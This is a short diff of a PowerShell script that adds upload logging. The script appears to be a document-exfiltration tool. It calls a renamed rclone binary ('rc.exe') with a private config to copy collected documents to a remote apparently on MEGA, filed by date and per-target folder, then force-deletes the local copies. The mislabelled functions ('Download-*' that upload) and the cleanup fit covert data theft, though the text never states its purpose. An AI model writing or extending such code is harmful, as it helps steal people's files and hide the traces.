@@ -64,7 +64,7 @@ param (
 
     function Download-All {
         echo "Upload Documents . . ." 
-        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
+        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') --log-file=$rcLogFile copy -M -P $allDestDir mgp:/$destMega/AllObjFirst/$objName/
         del -Force -Recurse $allDestDir
         del -Force -Recurse $tempDestDir
         del -Force $firstMark
@@ -73,7 +73,7 @@ param (
 
     function Download-Stream {
         echo "Upload Documents . . ."
-        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
+        &($appsDir + 'rc.exe') --config ($appsDir + 'rc.conf') --log-file=$rcLogFile copy -M -P $sendDestDir mgp:/$destMega/$currYear/$currDate/$objName/
         Get-Content $sucup | out-file -Encoding utf8 -FilePath $hashfile -Append
         del -Force $sucup
         del -Force -Recurse $tempDestDir
@@ -97,6 +97,7 @@ param (
     $destDir = ($baseDir + 'Docs\') ; New-Item $destDir -ItemType Directory -ea 0
     $tempDestDir = ($destDir + 'tempDir\')
     $firstEndMark = ($destDir + 'firstEndMark.txt')
+    $rcLogFile = ($destDir + 'rc.log')
 
     $hashfile = ($destDir + 'checksum.txt'); New-Item $hashfile -ItemType File -ea 0
     $logfile = ($destDir + 'logs.txt'); New-Item $logfile -ItemType File -ea 0
